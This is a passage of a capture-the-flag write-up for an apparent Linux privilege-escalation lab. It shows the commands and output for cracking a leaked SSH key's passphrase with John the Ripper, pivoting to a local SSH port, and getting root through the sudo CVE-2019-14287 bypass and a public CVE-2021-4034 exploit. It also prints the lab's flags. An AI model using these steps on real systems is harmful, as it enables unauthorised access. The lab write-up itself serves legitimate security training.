elusive_targets.txt  examples.desktop  flag.txt  old_robert_ssh
maya@linuxagency:~$ cat elusive_targets.txt
Welcome 47 glad you made this far.
You have made our Agency very proud.

But, we have a last unfinished job which is to infiltrate kronstadt industries.
He has a entrypoint at localhost.

Previously, Another agent tried to infiltrate kronstadt industries nearly 3 years back, But we failed.
Robert is involved to be illegally hacking into our server's.

He was able to transfer the .ssh folder from robert's home directory.

The old .ssh is kept inside old_robert_ssh directory incase you need it.

Good Luck!!!
    47
```

- Copied to the attacking machine

```console
❯ scp maya@10.10.219.213:/home/maya/old_robert_ssh/id_rsa .
maya@10.10.219.213's password:
id_rsa                                            100% 1766     5.9KB/s   00:00
```

- Converted `id_rsa` to hash 

```console
❯ ssh2john id_rsa > hash
```

- Cracked the hash

```console
❯ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
industryweapon   (id_rsa)
1g 0:00:00:04 DONE (2022-11-21 19:54) 0.2457g/s 1801Kp/s 1801Kc/s 1801KC/s indux.0210..industrium
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

- Now in the compromised machine, give id_rsa permissions

- There is no user `robert` on the machine

```console
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin
avahi-autoipd:x:106:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
rtkit:x:109:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
whoopsie:x:111:117::/nonexistent:/bin/false
kernoops:x:112:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:113:119::/var/lib/saned:/usr/sbin/nologin
pulse:x:114:120:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
avahi:x:115:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
colord:x:116:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
hplip:x:117:7:HPLIP system user,,,:/var/run/hplip:/bin/false
geoclue:x:118:124::/var/lib/geoclue:/usr/sbin/nologin
agent47:x:1000:1000:agent47,,,:/home/agent47:/bin/bash
sshd:x:121:65534::/run/sshd:/usr/sbin/nologin
mission1:x:1001:1001::/home/mission1:/bin/bash
mission2:x:1002:1002::/home/mission2:/bin/bash
mission3:x:1003:1003::/home/mission3:/bin/bash
mission4:x:1004:1004::/home/mission4:/bin/bash
mission5:x:1005:1005::/home/mission5:/bin/bash
mission6:x:1006:1006::/home/mission6:/bin/bash
mission7:x:1007:1007::/home/mission6:/bin/bash
mission8:x:1008:1008::/home/mission8:/bin/bash
mission9:x:1009:1009::/home/mission9:/bin/bash
mission10:x:1010:1010::/home/mission10:/bin/bash
mission11:x:1011:1011::/home/mission11:/bin/bash
mission12:x:1012:1012::/home/mission12:/bin/bash
mission13:x:1013:1013::/home/mission13:/bin/bash
mission14:x:1014:1014::/home/mission14:/bin/bash
mission15:x:1015:1015::/home/mission15:/bin/bash
mission16:x:1016:1016::/home/mission16:/bin/bash
mission17:x:1017:1017::/home/mission17:/bin/bash
mission18:x:1018:1018::/home/mission18:/bin/bash
mission19:x:1019:1019::/home/mission19:/bin/bash
mission20:x:1020:1020::/home/mission20:/bin/bash
mission21:x:1021:1021::/home/mission21:/bin/sh
mission22:x:1022:1022::/home/mission22:/usr/bin/python3
mission23:x:1023:1023::/home/mission23:/bin/bash
mission24:x:1024:1024::/home/mission24:/bin/bash
mission25:x:1025:1025::/home/mission25:/bin/bash
mission26:x:1026:1026::/home/mission26:/bin/bash
mission27:x:1027:1027::/home/mission27:/bin/bash
mission28:x:1028:1028::/home/mission28:/usr/bin/irb
mission29:x:1029:1029::/home/mission29:/bin/bash
mission30:x:1030:1030::/home/mission30:/bin/bash
viktor:x:1031:1031::/home/viktor:/bin/bash
silvio:x:1032:1032::/home/silvio:/bin/bash
reza:x:1033:1033::/home/reza:/bin/bash
dalia:x:1034:1034::/home/dalia:/bin/bash
jordan:x:1035:1035::/home/jordan:/bin/bash
ken:x:1036:1036::/home/ken:/bin/bash
sean:x:1037:1037::/home/sean:/bin/bash
penelope:x:1038:1038::/home/penelope:/bin/bash
maya:x:1039:1039::/home/maya:/bin/bash
xyan1d3:x:1040:1040::/home/xyan1d3:/bin/bash
0z09e:x:1041:1041::/home/0z09e:/bin/bash
diana:x:1042:1042::/home/diana:/bin/bash
zerotier-one:x:999:999::/var/lib/zerotier-one:/bin/sh
```

- There me be a private port running on the machine to other machine, checked it with `ss -nlpt`

```console
maya@linuxagency:~$ ss -nlpt
State                  Recv-Q                   Send-Q                                      Local Address:Port                                      Peer Address:Port
LISTEN                 0                        128                                             127.0.0.1:2222                                           0.0.0.0:*
LISTEN                 0                        128                                             127.0.0.1:80                                             0.0.0.0:*
LISTEN                 0                        128                                         127.0.0.53%lo:53                                             0.0.0.0:*
LISTEN                 0                        128                                               0.0.0.0:22                                             0.0.0.0:*
LISTEN                 0                        5                                               127.0.0.1:631                                            0.0.0.0:*
LISTEN                 0                        128                                             127.0.0.1:36319                                          0.0.0.0:*
LISTEN                 0                        128                                                  [::]:22                                                [::]:*
LISTEN                 0                        5                                                   [::1]:631                                               [::]:*
```

- It should be `127.0.0.1:2222`.
- Tried connecting with private key.

```console
maya@linuxagency:~/old_robert_ssh$ ssh -i id_rsa robert@127.0.0.1 -p 2222
robert@127.0.0.1's password:
Last login: Tue Jan 12 17:02:07 2021 from 172.17.0.1
robert@ec96850005d6:~$
```


- We are in, but didn't find the user flag.

```console
robert@ec96850005d6:~$ ls
robert.txt
robert@ec96850005d6:~$ cat robert.txt 
You shall not pass from here!!!

I will not allow ICA to take over my world.
```

- Loaded linpeas for privilege escalation.
- Found sudo version `1.8.21p2`.
- It is vulnerable to [2019-14287](https://www.exploit-db.com/exploits/47502){:target="\_blank"}

```console
robert@ec96850005d6:~$ sudo -u#-1 /bin/bash
root@ec96850005d6:~#
```

- Found user flag

```console
root@ec96850005d6:/root# cat success.txt
47 you made it!!!

You have made it, Robert has been taught a lesson not to mess with ICA.
Now, Return to our Agency back with some safe route.
All the previous door's have been closed.

Good Luck Amigo!
root@ec96850005d6:/root# cat user.txt
user{620fb94d32470e1e9dcf8926481efc96}
```

- Connected with ssh as maya back to the machine.


# Root flag

- Now on maya loaded linpeas and found it vulnerable to [CVE-2021-4034](https://nvd.nist.gov/vuln/detail/cve-2021-4034){:target="\_blank"}
- Found an [exploit](https://github.com/arthepsy/CVE-2021-4034){:target="\blank"}.
- Loaded it to machine and compiled it.

```console
maya@linuxagency:~$ gcc cve-2021-4034-poc.c -o exploit
maya@linuxagency:~$ ls
cve-2021-4034-poc.c  examples.desktop  flag.txt        old_robert_ssh
elusive_targets.txt  exploit           linpeas-new.sh
```

- Executed the exploit and got root.

```console
maya@linuxagency:~$ ./exploit
# whoami
root
# cd /root
# ls
message.txt  root.txt
# cat message.txt
Nice Job 47
We are really impressed with your skills

Hope you enjoyed your journey!!

Your director's of ICA
   0z09e & Xyan1d3


========>0z09e
https://github.com/0z09e
https://twitter.com/0z09e

========>Xyan1d3
https://twitter.com/xyan1d3
https://github.com/xyan1d3
# cat root.txt
root{62ca2110ce7df377872dd9f0797f8476}
```
